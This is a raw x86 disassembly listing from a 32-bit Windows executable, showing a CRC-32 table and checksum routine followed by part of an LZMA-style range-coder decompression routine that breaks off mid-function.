  4064d9:	8b 44 24 04          	mov    0x4(%esp),%eax
  4064dd:	56                   	push   %esi
  4064de:	8b f0                	mov    %eax,%esi
  4064e0:	57                   	push   %edi
  4064e1:	c1 e6 03             	shl    $0x3,%esi
  4064e4:	8b be 58 a2 40 00    	mov    0x40a258(%esi),%edi
  4064ea:	57                   	push   %edi
  4064eb:	ff 15 54 81 40 00    	call   *0x408154
  4064f1:	85 c0                	test   %eax,%eax
  4064f3:	75 0a                	jne    0x4064ff
  4064f5:	57                   	push   %edi
  4064f6:	e8 70 ff ff ff       	call   0x40646b
  4064fb:	85 c0                	test   %eax,%eax
  4064fd:	74 0f                	je     0x40650e
  4064ff:	ff b6 5c a2 40 00    	push   0x40a25c(%esi)
  406505:	50                   	push   %eax
  406506:	ff 15 e8 80 40 00    	call   *0x4080e8
  40650c:	eb 02                	jmp    0x406510
  40650e:	33 c0                	xor    %eax,%eax
  406510:	5f                   	pop    %edi
  406511:	5e                   	pop    %esi
  406512:	c2 04 00             	ret    $0x4
  406515:	55                   	push   %ebp
  406516:	8b ec                	mov    %esp,%ebp
  406518:	83 ec 1c             	sub    $0x1c,%esp
  40651b:	56                   	push   %esi
  40651c:	8b 75 08             	mov    0x8(%ebp),%esi
  40651f:	57                   	push   %edi
  406520:	8b 3d ec 81 40 00    	mov    0x4081ec,%edi
  406526:	eb 0a                	jmp    0x406532
  406528:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40652b:	50                   	push   %eax
  40652c:	ff 15 e8 81 40 00    	call   *0x4081e8
  406532:	6a 01                	push   $0x1
  406534:	56                   	push   %esi
  406535:	56                   	push   %esi
  406536:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406539:	6a 00                	push   $0x0
  40653b:	50                   	push   %eax
  40653c:	ff d7                	call   *%edi
  40653e:	85 c0                	test   %eax,%eax
  406540:	75 e6                	jne    0x406528
  406542:	5f                   	pop    %edi
  406543:	5e                   	pop    %esi
  406544:	c9                   	leave
  406545:	c2 04 00             	ret    $0x4
  406548:	ff 25 e8 80 40 00    	jmp    *0x4080e8
  40654e:	55                   	push   %ebp
  40654f:	8b ec                	mov    %esp,%ebp
  406551:	51                   	push   %ecx
  406552:	56                   	push   %esi
  406553:	8b 35 f0 80 40 00    	mov    0x4080f0,%esi
  406559:	57                   	push   %edi
  40655a:	6a 64                	push   $0x64
  40655c:	ff 75 08             	push   0x8(%ebp)
  40655f:	ff d6                	call   *%esi
  406561:	bf 02 01 00 00       	mov    $0x102,%edi
  406566:	eb 0e                	jmp    0x406576
  406568:	6a 0f                	push   $0xf
  40656a:	e8 a6 ff ff ff       	call   0x406515
  40656f:	6a 64                	push   $0x64
  406571:	ff 75 08             	push   0x8(%ebp)
  406574:	ff d6                	call   *%esi
  406576:	3b c7                	cmp    %edi,%eax
  406578:	74 ee                	je     0x406568
  40657a:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40657d:	50                   	push   %eax
  40657e:	ff 75 08             	push   0x8(%ebp)
  406581:	ff 15 ec 80 40 00    	call   *0x4080ec
  406587:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40658a:	5f                   	pop    %edi
  40658b:	5e                   	pop    %esi
  40658c:	c9                   	leave
  40658d:	c2 04 00             	ret    $0x4
  406590:	83 3d c4 32 42 00 00 	cmpl   $0x0,0x4232c4
  406597:	56                   	push   %esi
  406598:	75 2d                	jne    0x4065c7
  40659a:	33 c9                	xor    %ecx,%ecx
  40659c:	6a 08                	push   $0x8
  40659e:	8b c1                	mov    %ecx,%eax
  4065a0:	5e                   	pop    %esi
  4065a1:	8b d0                	mov    %eax,%edx
  4065a3:	80 e2 01             	and    $0x1,%dl
  4065a6:	f6 da                	neg    %dl
  4065a8:	1b d2                	sbb    %edx,%edx
  4065aa:	81 e2 20 83 b8 ed    	and    $0xedb88320,%edx
  4065b0:	d1 e8                	shr    $1,%eax
  4065b2:	33 c2                	xor    %edx,%eax
  4065b4:	4e                   	dec    %esi
  4065b5:	75 ea                	jne    0x4065a1
  4065b7:	89 04 8d c0 32 42 00 	mov    %eax,0x4232c0(,%ecx,4)
  4065be:	41                   	inc    %ecx
  4065bf:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  4065c5:	7c d5                	jl     0x40659c
  4065c7:	8b 54 24 10          	mov    0x10(%esp),%edx
  4065cb:	8b 44 24 08          	mov    0x8(%esp),%eax
  4065cf:	85 d2                	test   %edx,%edx
  4065d1:	f7 d0                	not    %eax
  4065d3:	76 23                	jbe    0x4065f8
  4065d5:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4065d9:	57                   	push   %edi
  4065da:	0f b6 39             	movzbl (%ecx),%edi
  4065dd:	8b f0                	mov    %eax,%esi
  4065df:	81 e6 ff 00 00 00    	and    $0xff,%esi
  4065e5:	33 f7                	xor    %edi,%esi
  4065e7:	c1 e8 08             	shr    $0x8,%eax
  4065ea:	8b 34 b5 c0 32 42 00 	mov    0x4232c0(,%esi,4),%esi
  4065f1:	33 c6                	xor    %esi,%eax
  4065f3:	41                   	inc    %ecx
  4065f4:	4a                   	dec    %edx
  4065f5:	75 e3                	jne    0x4065da
  4065f7:	5f                   	pop    %edi
  4065f8:	f7 d0                	not    %eax
  4065fa:	5e                   	pop    %esi
  4065fb:	c2 0c 00             	ret    $0xc
  4065fe:	b8 80 00 00 00       	mov    $0x80,%eax
  406603:	48                   	dec    %eax
  406604:	c6 04 08 00          	movb   $0x0,(%eax,%ecx,1)
  406608:	75 f9                	jne    0x406603
  40660a:	83 49 78 ff          	orl    $0xffffffff,0x78(%ecx)
  40660e:	33 c0                	xor    %eax,%eax
  406610:	40                   	inc    %eax
  406611:	89 41 68             	mov    %eax,0x68(%ecx)
  406614:	89 41 64             	mov    %eax,0x64(%ecx)
  406617:	89 41 60             	mov    %eax,0x60(%ecx)
  40661a:	89 41 5c             	mov    %eax,0x5c(%ecx)
  40661d:	c3                   	ret
  40661e:	55                   	push   %ebp
  40661f:	8b ec                	mov    %esp,%ebp
  406621:	81 ec 90 00 00 00    	sub    $0x90,%esp
  406627:	53                   	push   %ebx
  406628:	56                   	push   %esi
  406629:	57                   	push   %edi
  40662a:	6a 22                	push   $0x22
  40662c:	8b f1                	mov    %ecx,%esi
  40662e:	59                   	pop    %ecx
  40662f:	8d bd 78 ff ff ff    	lea    -0x88(%ebp),%edi
  406635:	89 b5 70 ff ff ff    	mov    %esi,-0x90(%ebp)
  40663b:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40663d:	83 7d d0 ff          	cmpl   $0xffffffff,-0x30(%ebp)
  406641:	75 08                	jne    0x40664b
  406643:	33 c0                	xor    %eax,%eax
  406645:	40                   	inc    %eax
  406646:	e9 20 0a 00 00       	jmp    0x40706b
  40664b:	8b 5d bc             	mov    -0x44(%ebp),%ebx
  40664e:	8b 75 ac             	mov    -0x54(%ebp),%esi
  406651:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
  406657:	83 f8 1c             	cmp    $0x1c,%eax
  40665a:	0f 87 08 0a 00 00    	ja     0x407068
  406660:	ff 24 85 70 70 40 00 	jmp    *0x407070(,%eax,4)
  406667:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  40666b:	0f 84 e2 09 00 00    	je     0x407053
  406671:	8b 45 90             	mov    -0x70(%ebp),%eax
  406674:	ff 4d 94             	decl   -0x6c(%ebp)
  406677:	ff 45 90             	incl   -0x70(%ebp)
  40667a:	8a 00                	mov    (%eax),%al
  40667c:	3c e1                	cmp    $0xe1,%al
  40667e:	0f 87 e4 09 00 00    	ja     0x407068
  406684:	0f b6 c0             	movzbl %al,%eax
  406687:	6a 2d                	push   $0x2d
  406689:	99                   	cltd
  40668a:	59                   	pop    %ecx
  40668b:	f7 f9                	idiv   %ecx
  40668d:	6a 09                	push   $0x9
  40668f:	59                   	pop    %ecx
  406690:	8b f0                	mov    %eax,%esi
  406692:	0f b6 c2             	movzbl %dl,%eax
  406695:	99                   	cltd
  406696:	f7 f9                	idiv   %ecx
  406698:	8b ce                	mov    %esi,%ecx
  40669a:	0f b6 fa             	movzbl %dl,%edi
  40669d:	33 d2                	xor    %edx,%edx
  40669f:	89 7d c4             	mov    %edi,-0x3c(%ebp)
  4066a2:	42                   	inc    %edx
  4066a3:	d3 e2                	shl    %cl,%edx
  4066a5:	8b c8                	mov    %eax,%ecx
  4066a7:	4a                   	dec    %edx
  4066a8:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  4066ab:	33 d2                	xor    %edx,%edx
  4066ad:	42                   	inc    %edx
  4066ae:	d3 e2                	shl    %cl,%edx
  4066b0:	8d 0c 37             	lea    (%edi,%esi,1),%ecx
  4066b3:	be 00 03 00 00       	mov    $0x300,%esi
  4066b8:	d3 e6                	shl    %cl,%esi
  4066ba:	4a                   	dec    %edx
  4066bb:	89 55 e8             	mov    %edx,-0x18(%ebp)
  4066be:	81 c6 36 07 00 00    	add    $0x736,%esi
  4066c4:	8d 3c 36             	lea    (%esi,%esi,1),%edi
  4066c7:	3b 7d 88             	cmp    -0x78(%ebp),%edi
  4066ca:	74 26                	je     0x4066f2
  4066cc:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4066d0:	74 09                	je     0x4066db
  4066d2:	ff 75 fc             	push   -0x4(%ebp)
  4066d5:	ff 15 5c 81 40 00    	call   *0x40815c
  4066db:	57                   	push   %edi
  4066dc:	6a 40                	push   $0x40
  4066de:	ff 15 58 81 40 00    	call   *0x408158
  4066e4:	85 c0                	test   %eax,%eax
  4066e6:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4066e9:	0f 84 79 09 00 00    	je     0x407068
  4066ef:	89 7d 88             	mov    %edi,-0x78(%ebp)
  4066f2:	85 f6                	test   %esi,%esi
  4066f4:	74 0c                	je     0x406702
  4066f6:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4066f9:	4e                   	dec    %esi
  4066fa:	66 c7 04 70 00 04    	movw   $0x400,(%eax,%esi,2)
  406700:	75 f4                	jne    0x4066f6
  406702:	83 65 b8 00          	andl   $0x0,-0x48(%ebp)
  406706:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  40670a:	eb 26                	jmp    0x406732
  40670c:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406710:	0f 84 a6 08 00 00    	je     0x406fbc
  406716:	8b 45 b8             	mov    -0x48(%ebp),%eax
  406719:	ff 4d 94             	decl   -0x6c(%ebp)
  40671c:	8b c8                	mov    %eax,%ecx
  40671e:	8b 45 90             	mov    -0x70(%ebp),%eax
  406721:	c1 e1 03             	shl    $0x3,%ecx
  406724:	0f b6 00             	movzbl (%eax),%eax
  406727:	d3 e0                	shl    %cl,%eax
  406729:	09 45 c0             	or     %eax,-0x40(%ebp)
  40672c:	ff 45 90             	incl   -0x70(%ebp)
  40672f:	ff 45 b8             	incl   -0x48(%ebp)
  406732:	83 7d b8 04          	cmpl   $0x4,-0x48(%ebp)
  406736:	7c d4                	jl     0x40670c
  406738:	8b 45 c0             	mov    -0x40(%ebp),%eax
  40673b:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  40673e:	74 28                	je     0x406768
  406740:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  406744:	89 45 8c             	mov    %eax,-0x74(%ebp)
  406747:	74 09                	je     0x406752
  406749:	ff 75 f8             	push   -0x8(%ebp)
  40674c:	ff 15 5c 81 40 00    	call   *0x40815c
  406752:	ff 75 c0             	push   -0x40(%ebp)
  406755:	6a 40                	push   $0x40
  406757:	ff 15 58 81 40 00    	call   *0x408158
  40675d:	85 c0                	test   %eax,%eax
  40675f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406762:	0f 84 00 09 00 00    	je     0x407068
  406768:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40676b:	8b 4d 8c             	mov    -0x74(%ebp),%ecx
  40676e:	c7 45 b8 05 00 00 00 	movl   $0x5,-0x48(%ebp)
  406775:	80 64 08 ff 00       	andb   $0x0,-0x1(%eax,%ecx,1)
  40677a:	eb 21                	jmp    0x40679d
  40677c:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406780:	0f 84 45 08 00 00    	je     0x406fcb
  406786:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406789:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40678c:	ff 4d 94             	decl   -0x6c(%ebp)
  40678f:	0f b6 09             	movzbl (%ecx),%ecx
  406792:	c1 e0 08             	shl    $0x8,%eax
  406795:	0b c1                	or     %ecx,%eax
  406797:	ff 45 90             	incl   -0x70(%ebp)
  40679a:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40679d:	8b 45 b8             	mov    -0x48(%ebp),%eax
  4067a0:	ff 4d b8             	decl   -0x48(%ebp)
  4067a3:	85 c0                	test   %eax,%eax
  4067a5:	75 d5                	jne    0x40677c
  4067a7:	8b 45 a0             	mov    -0x60(%ebp),%eax
  4067aa:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4067ad:	23 45 e4             	and    -0x1c(%ebp),%eax
  4067b0:	c7 85 7c ff ff ff 06 	movl   $0x6,-0x84(%ebp)
  4067b7:	00 00 00 
  4067ba:	c1 e1 04             	shl    $0x4,%ecx
  4067bd:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  4067c0:	03 c8                	add    %eax,%ecx
  4067c2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4067c5:	8d 34 48             	lea    (%eax,%ecx,2),%esi
  4067c8:	e9 6c 06 00 00       	jmp    0x406e39
  4067cd:	33 d2                	xor    %edx,%edx
  4067cf:	39 55 c0             	cmp    %edx,-0x40(%ebp)
  4067d2:	75 6f                	jne    0x406843
  4067d4:	0f b6 45 a4          	movzbl -0x5c(%ebp),%eax
  4067d8:	8b 75 a0             	mov    -0x60(%ebp),%esi
  4067db:	b1 08                	mov    $0x8,%cl
  4067dd:	2a 4d c4             	sub    -0x3c(%ebp),%cl
  4067e0:	23 75 e8             	and    -0x18(%ebp),%esi
  4067e3:	d3 e8                	shr    %cl,%eax
  4067e5:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  4067e8:	d3 e6                	shl    %cl,%esi
  4067ea:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4067ed:	03 c6                	add    %esi,%eax
  4067ef:	8d 04 40             	lea    (%eax,%eax,2),%eax
  4067f2:	c1 e0 09             	shl    $0x9,%eax
  4067f5:	83 7d c8 04          	cmpl   $0x4,-0x38(%ebp)
  4067f9:	8d 84 08 6c 0e 00 00 	lea    0xe6c(%eax,%ecx,1),%eax
  406800:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406803:	7d 05                	jge    0x40680a
  406805:	89 55 c8             	mov    %edx,-0x38(%ebp)
  406808:	eb 10                	jmp    0x40681a
  40680a:	83 7d c8 0a          	cmpl   $0xa,-0x38(%ebp)
  40680e:	7d 06                	jge    0x406816
  406810:	83 6d c8 03          	subl   $0x3,-0x38(%ebp)
  406814:	eb 04                	jmp    0x40681a
  406816:	83 6d c8 06          	subl   $0x6,-0x38(%ebp)
  40681a:	39 55 cc             	cmp    %edx,-0x34(%ebp)
  40681d:	74 1c                	je     0x40683b
  40681f:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406822:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  406825:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406828:	72 03                	jb     0x40682d
  40682a:	03 45 8c             	add    -0x74(%ebp),%eax
  40682d:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406830:	33 db                	xor    %ebx,%ebx
  406832:	43                   	inc    %ebx
  406833:	8a 04 08             	mov    (%eax,%ecx,1),%al
  406836:	88 45 a5             	mov    %al,-0x5b(%ebp)
  406839:	eb 68                	jmp    0x4068a3
  40683b:	33 db                	xor    %ebx,%ebx
  40683d:	43                   	inc    %ebx
  40683e:	e9 cd 01 00 00       	jmp    0x406a10
  406843:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406846:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406849:	c7 45 cc 01 00 00 00 	movl   $0x1,-0x34(%ebp)
  406850:	c7 85 7c ff ff ff 07 	movl   $0x7,-0x84(%ebp)
  406857:	00 00 00 
  40685a:	8d b4 48 80 01 00 00 	lea    0x180(%eax,%ecx,2),%esi
  406861:	e9 d3 05 00 00       	jmp    0x406e39
  406866:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  40686a:	0f 84 67 07 00 00    	je     0x406fd7
  406870:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406873:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406876:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  40687a:	0f b6 09             	movzbl (%ecx),%ecx
  40687d:	ff 4d 94             	decl   -0x6c(%ebp)
  406880:	c1 e0 08             	shl    $0x8,%eax
  406883:	0b c1                	or     %ecx,%eax
  406885:	ff 45 90             	incl   -0x70(%ebp)
  406888:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40688b:	8b 45 c0             	mov    -0x40(%ebp),%eax
  40688e:	39 45 b8             	cmp    %eax,-0x48(%ebp)
  406891:	0f 85 ad 00 00 00    	jne    0x406944
  406897:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  40689d:	0f 8d 05 01 00 00    	jge    0x4069a8
  4068a3:	0f b6 45 a5          	movzbl -0x5b(%ebp),%eax
  4068a7:	d0 65 a5             	shlb   $1,-0x5b(%ebp)
  4068aa:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  4068ad:	c1 e8 07             	shr    $0x7,%eax
  4068b0:	89 45 b8             	mov    %eax,-0x48(%ebp)
  4068b3:	40                   	inc    %eax
  4068b4:	c1 e0 08             	shl    $0x8,%eax
  4068b7:	03 c3                	add    %ebx,%eax
  4068b9:	8d 34 41             	lea    (%ecx,%eax,2),%esi
  4068bc:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4068bf:	c1 e9 0b             	shr    $0xb,%ecx
  4068c2:	66 8b 06             	mov    (%esi),%ax
  4068c5:	89 75 ac             	mov    %esi,-0x54(%ebp)
  4068c8:	0f b7 d0             	movzwl %ax,%edx
  4068cb:	0f af ca             	imul   %edx,%ecx
  4068ce:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  4068d1:	73 1a                	jae    0x4068ed
  4068d3:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  4068d7:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4068da:	b9 00 08 00 00       	mov    $0x800,%ecx
  4068df:	2b ca                	sub    %edx,%ecx
  4068e1:	c1 f9 05             	sar    $0x5,%ecx
  4068e4:	03 c8                	add    %eax,%ecx
  4068e6:	03 db                	add    %ebx,%ebx
  4068e8:	66 89 0e             	mov    %cx,(%esi)
  4068eb:	eb 1d                	jmp    0x40690a
  4068ed:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  4068f0:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  4068f3:	66 8b c8             	mov    %ax,%cx
  4068f6:	c7 45 c0 01 00 00 00 	movl   $0x1,-0x40(%ebp)
  4068fd:	66 c1 e9 05          	shr    $0x5,%cx
  406901:	2b c1                	sub    %ecx,%eax
  406903:	8d 5c 1b 01          	lea    0x1(%ebx,%ebx,1),%ebx
  406907:	66 89 06             	mov    %ax,(%esi)
  40690a:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406911:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406914:	0f 83 71 ff ff ff    	jae    0x40688b
  40691a:	e9 47 ff ff ff       	jmp    0x406866
  40691f:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406923:	0f 84 ba 06 00 00    	je     0x406fe3
  406929:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  40692c:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40692f:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406933:	0f b6 09             	movzbl (%ecx),%ecx
  406936:	ff 4d 94             	decl   -0x6c(%ebp)
  406939:	c1 e0 08             	shl    $0x8,%eax
  40693c:	0b c1                	or     %ecx,%eax
  40693e:	ff 45 90             	incl   -0x70(%ebp)
  406941:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406944:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  40694a:	7d 5c                	jge    0x4069a8
  40694c:	8b 45 a8             	mov    -0x58(%ebp),%eax
  40694f:	8d 14 1b             	lea    (%ebx,%ebx,1),%edx
  406952:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406955:	8d 34 02             	lea    (%edx,%eax,1),%esi
  406958:	c1 e9 0b             	shr    $0xb,%ecx
  40695b:	66 8b 06             	mov    (%esi),%ax
  40695e:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406961:	0f b7 f8             	movzwl %ax,%edi
  406964:	0f af cf             	imul   %edi,%ecx
  406967:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  40696a:	73 16                	jae    0x406982
  40696c:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40696f:	b9 00 08 00 00       	mov    $0x800,%ecx
  406974:	2b cf                	sub    %edi,%ecx
  406976:	c1 f9 05             	sar    $0x5,%ecx
  406979:	03 c8                	add    %eax,%ecx
  40697b:	03 db                	add    %ebx,%ebx
  40697d:	66 89 0e             	mov    %cx,(%esi)
  406980:	eb 15                	jmp    0x406997
  406982:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406985:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406988:	66 8b c8             	mov    %ax,%cx
  40698b:	8d 5a 01             	lea    0x1(%edx),%ebx
  40698e:	66 c1 e9 05          	shr    $0x5,%cx
  406992:	2b c1                	sub    %ecx,%eax
  406994:	66 89 06             	mov    %ax,(%esi)
  406997:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  40699e:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  4069a1:	73 a1                	jae    0x406944
  4069a3:	e9 77 ff ff ff       	jmp    0x40691f
  4069a8:	83 65 cc 00          	andl   $0x0,-0x34(%ebp)
  4069ac:	8a 45 bc             	mov    -0x44(%ebp),%al
  4069af:	88 45 a4             	mov    %al,-0x5c(%ebp)
  4069b2:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  4069b6:	0f 84 3f 06 00 00    	je     0x406ffb
  4069bc:	8b 4d 98             	mov    -0x68(%ebp),%ecx
  4069bf:	8a 45 a4             	mov    -0x5c(%ebp),%al
  4069c2:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4069c5:	ff 45 a0             	incl   -0x60(%ebp)
  4069c8:	ff 45 98             	incl   -0x68(%ebp)
  4069cb:	ff 4d 9c             	decl   -0x64(%ebp)
  4069ce:	88 01                	mov    %al,(%ecx)
  4069d0:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4069d3:	88 04 11             	mov    %al,(%ecx,%edx,1)
  4069d6:	8d 41 01             	lea    0x1(%ecx),%eax
  4069d9:	33 d2                	xor    %edx,%edx
  4069db:	f7 75 8c             	divl   -0x74(%ebp)
  4069de:	e9 95 01 00 00       	jmp    0x406b78
  4069e3:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  4069e7:	0f 84 02 06 00 00    	je     0x406fef
  4069ed:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  4069f0:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4069f3:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  4069f7:	0f b6 09             	movzbl (%ecx),%ecx
  4069fa:	ff 4d 94             	decl   -0x6c(%ebp)
  4069fd:	c1 e0 08             	shl    $0x8,%eax
  406a00:	0b c1                	or     %ecx,%eax
  406a02:	ff 45 90             	incl   -0x70(%ebp)
  406a05:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406a08:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406a0e:	7d 9c                	jge    0x4069ac
  406a10:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406a13:	8d 14 1b             	lea    (%ebx,%ebx,1),%edx
  406a16:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406a19:	8d 34 02             	lea    (%edx,%eax,1),%esi
  406a1c:	c1 e9 0b             	shr    $0xb,%ecx
  406a1f:	66 8b 06             	mov    (%esi),%ax
  406a22:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406a25:	0f b7 f8             	movzwl %ax,%edi
  406a28:	0f af cf             	imul   %edi,%ecx
  406a2b:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406a2e:	73 16                	jae    0x406a46
  406a30:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406a33:	b9 00 08 00 00       	mov    $0x800,%ecx
  406a38:	2b cf                	sub    %edi,%ecx
  406a3a:	c1 f9 05             	sar    $0x5,%ecx
  406a3d:	03 c8                	add    %eax,%ecx
  406a3f:	03 db                	add    %ebx,%ebx
  406a41:	66 89 0e             	mov    %cx,(%esi)
  406a44:	eb 15                	jmp    0x406a5b
  406a46:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406a49:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406a4c:	66 8b c8             	mov    %ax,%cx
  406a4f:	8d 5a 01             	lea    0x1(%edx),%ebx
  406a52:	66 c1 e9 05          	shr    $0x5,%cx
  406a56:	2b c1                	sub    %ecx,%eax
  406a58:	66 89 06             	mov    %ax,(%esi)
  406a5b:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406a62:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406a65:	73 a1                	jae    0x406a08
  406a67:	e9 77 ff ff ff       	jmp    0x4069e3
  406a6c:	83 7d c0 01          	cmpl   $0x1,-0x40(%ebp)
  406a70:	75 1c                	jne    0x406a8e
  406a72:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406a75:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406a78:	c7 85 7c ff ff ff 08 	movl   $0x8,-0x84(%ebp)
  406a7f:	00 00 00 
  406a82:	8d b4 48 98 01 00 00 	lea    0x198(%eax,%ecx,2),%esi
  406a89:	e9 ab 03 00 00       	jmp    0x406e39
  406a8e:	8b 45 dc             	mov    -0x24(%ebp),%eax
  406a91:	c7 45 80 16 00 00 00 	movl   $0x16,-0x80(%ebp)
  406a98:	89 45 e0             	mov    %eax,-0x20(%ebp)
  406a9b:	8b 45 d8             	mov    -0x28(%ebp),%eax
  406a9e:	89 45 dc             	mov    %eax,-0x24(%ebp)
  406aa1:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  406aa4:	89 45 d8             	mov    %eax,-0x28(%ebp)
  406aa7:	33 c0                	xor    %eax,%eax
  406aa9:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  406aad:	0f 9d c0             	setge  %al
  406ab0:	48                   	dec    %eax
  406ab1:	24 fd                	and    $0xfd,%al
  406ab3:	83 c0 0a             	add    $0xa,%eax
  406ab6:	89 45 c8             	mov    %eax,-0x38(%ebp)
  406ab9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406abc:	05 64 06 00 00       	add    $0x664,%eax
  406ac1:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406ac4:	8b 75 a8             	mov    -0x58(%ebp),%esi
  406ac7:	c7 85 7c ff ff ff 12 	movl   $0x12,-0x84(%ebp)
  406ace:	00 00 00 
  406ad1:	e9 63 03 00 00       	jmp    0x406e39
  406ad6:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406ada:	75 21                	jne    0x406afd
  406adc:	8b 45 c8             	mov    -0x38(%ebp),%eax
  406adf:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406ae2:	83 c0 0f             	add    $0xf,%eax
  406ae5:	c7 85 7c ff ff ff 09 	movl   $0x9,-0x84(%ebp)
  406aec:	00 00 00 
  406aef:	c1 e0 04             	shl    $0x4,%eax
  406af2:	03 45 b4             	add    -0x4c(%ebp),%eax
  406af5:	8d 34 41             	lea    (%ecx,%eax,2),%esi
  406af8:	e9 3c 03 00 00       	jmp    0x406e39
  406afd:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406b00:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406b03:	c7 85 7c ff ff ff 0a 	movl   $0xa,-0x84(%ebp)
  406b0a:	00 00 00 
  406b0d:	8d b4 48 b0 01 00 00 	lea    0x1b0(%eax,%ecx,2),%esi
  406b14:	e9 20 03 00 00       	jmp    0x406e39
  406b19:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406b1d:	0f 85 b1 00 00 00    	jne    0x406bd4
  406b23:	83 7d a0 00          	cmpl   $0x0,-0x60(%ebp)
  406b27:	0f 84 3b 05 00 00    	je     0x407068
  406b2d:	33 c0                	xor    %eax,%eax
  406b2f:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  406b33:	0f 9d c0             	setge  %al
  406b36:	8d 44 00 09          	lea    0x9(%eax,%eax,1),%eax
  406b3a:	89 45 c8             	mov    %eax,-0x38(%ebp)
  406b3d:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  406b41:	0f 84 c0 04 00 00    	je     0x407007
  406b47:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406b4a:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  406b4d:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406b50:	72 03                	jb     0x406b55
  406b52:	03 45 8c             	add    -0x74(%ebp),%eax
  406b55:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406b58:	8a 0c 10             	mov    (%eax,%edx,1),%cl
